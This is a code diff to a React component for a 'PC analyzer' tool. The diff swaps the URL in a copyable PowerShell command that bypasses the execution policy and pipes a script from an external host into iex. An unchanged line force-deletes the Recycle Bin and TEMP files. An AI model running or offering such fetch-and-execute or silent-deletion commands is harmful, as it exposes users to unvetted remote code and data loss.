@@ -247,7 +247,7 @@ export const PcAnalyzerView: React.FC<PcAnalyzerViewProps> = ({
     );
   };
 
-  const powershellBridgeCommand = `powershell -ExecutionPolicy Bypass -c "irm https://vota.axy.my.id/bridge.ps1 | iex"`;
+  const powershellBridgeCommand = `powershell -ExecutionPolicy Bypass -c "irm https://vota.axy.my.id/vota.ps1 | iex"`;
   const powershellCleanCommand = `powershell -c "Clear-RecycleBin -Force -ErrorAction SilentlyContinue; Remove-Item '$env:TEMP\\*' -Recurse -Force -ErrorAction SilentlyContinue; Write-Host 'PC Cache Cleared!' -ForegroundColor Green"`;
 
   const handleCopyBridgeCommand = () => {
